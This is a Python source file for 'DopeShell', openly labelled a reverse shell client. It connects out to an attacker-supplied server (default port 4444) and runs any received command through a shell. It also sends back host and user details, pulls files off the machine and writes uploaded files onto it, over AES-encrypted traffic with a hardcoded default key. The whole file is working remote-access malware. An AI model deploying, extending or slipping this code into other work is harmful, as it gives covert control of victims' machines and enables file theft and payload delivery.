# dopeshell/client.py

import socket
import subprocess
import os
import getpass
import platform
import shutil
import base64
import argparse
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import subprocess
import time
class DopeShellclient:
    def __init__(self, server_ip, server_port, key):
        self.server_ip = server_ip
        self.server_port = server_port
        self.key = key
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def encrypt(self, data):
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(self.key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = iv + encryptor.update(data) + encryptor.finalize()
        return base64.b64encode(encrypted_data)

    def decrypt(self, data):
        data = base64.b64decode(data)
        iv = data[:16]
        cipher = Cipher(algorithms.AES(self.key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(data[16:]) + decryptor.finalize()
        return decrypted_data

    def execute_command(self, command):
        invalid = False    
        output = b'no error returned'
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        timeout = 5  # seconds
        start_time = time.time()

        while process.poll() is None:
            time.sleep(1)  # Wait for 1 second
            if time.time() - start_time > timeout:
                process.kill()
                invalid = True
                break

        if invalid == False:
            try:
                output, error = process.communicate(timeout=10)
                if error:
                    return error
            except:
                output = "Unkown error!"

        return output

    def run(self):
        self.sock.connect((self.server_ip, self.server_port))
        while True:
            command = self.decrypt(self.sock.recv(4096)).decode('utf-8')
            
            if command.lower() == 'exit':
                break

            elif command.lower() == 'info':
                try:
                    hostname = socket.gethostname()
                    local_ip = socket.gethostbyname(hostname)
                except:
                    local_ip = "Unable to fetch IP"

                client_info = (
                    f"OS: {platform.system()} {platform.release()}\n"
                    f"Architecture: {platform.machine()}\n"
                    f"Hostname: {platform.node()}\n"
                    f"Processor: {platform.processor()}\n"
                    f"Current User: {getpass.getuser()}\n"
                    f"Local IP Address: {local_ip}\n"
                )
                self.sock.send(self.encrypt(client_info.encode('utf-8')))

            elif command.lower().startswith('ls'):
                directory = command.split()[1] if len(command.split()) > 1 else '.'
                try:
                    files = "\n".join(os.listdir(directory))
                except FileNotFoundError:
                    files = f"[-] Directory '{directory}' not found."
                self.sock.send(self.encrypt(files.encode('utf-8')))

            elif command.lower() == 'pwd':
                cwd = os.getcwd()
                self.sock.send(self.encrypt(cwd.encode('utf-8')))

            elif command.lower().startswith('cd'):
                directory = command.split()[1] if len(command.split()) > 1 else '.'
                try:
                    os.chdir(directory)
                    self.sock.send(self.encrypt(b"[+] Changed directory."))
                except FileNotFoundError:
                    self.sock.send(self.encrypt(f"[-] Directory '{directory}' not found.".encode('utf-8')))

            elif command.lower().startswith('download'):
                _, file_path = command.split()
                try:
                    with open(file_path, 'rb') as f:
                        while chunk := f.read(4096):
                            self.sock.send(self.encrypt(chunk))
                    self.sock.send(self.encrypt(b'EOF'))
                except FileNotFoundError:
                    self.sock.send(self.encrypt(b"[-] File not found."))

            elif command.lower().startswith('upload'):
                _, file_name = command.split()
                with open(file_name, 'wb') as f:
                    while True:
                        file_data = self.decrypt(self.sock.recv(4096))
                        if file_data == b'EOF':
                            break
                        f.write(file_data)
                self.sock.send(self.encrypt(b"[+] File upload complete."))

            else:
                output = self.execute_command(command)
                self.sock.send(self.encrypt(output))

        self.sock.close()


def main():
    parser = argparse.ArgumentParser(description="DopeShell Reverse Shell Client")
    parser.add_argument("--server-ip", type=str, required=True, help="IP address of the server to connect to")
    parser.add_argument("--server-port", type=int, default=4444, help="Port of the server to connect to (default: 4444)")
    parser.add_argument("--key", type=str, default="myverystrongpasswordo32bitlength", help="Encryption key (32 bytes)")

    args = parser.parse_args()

    key = args.key.encode("utf-8")
    client = DopeShellclient(args.server_ip, args.server_port, key)
    client.run()

#main function
if __name__ == "__main__":
    main()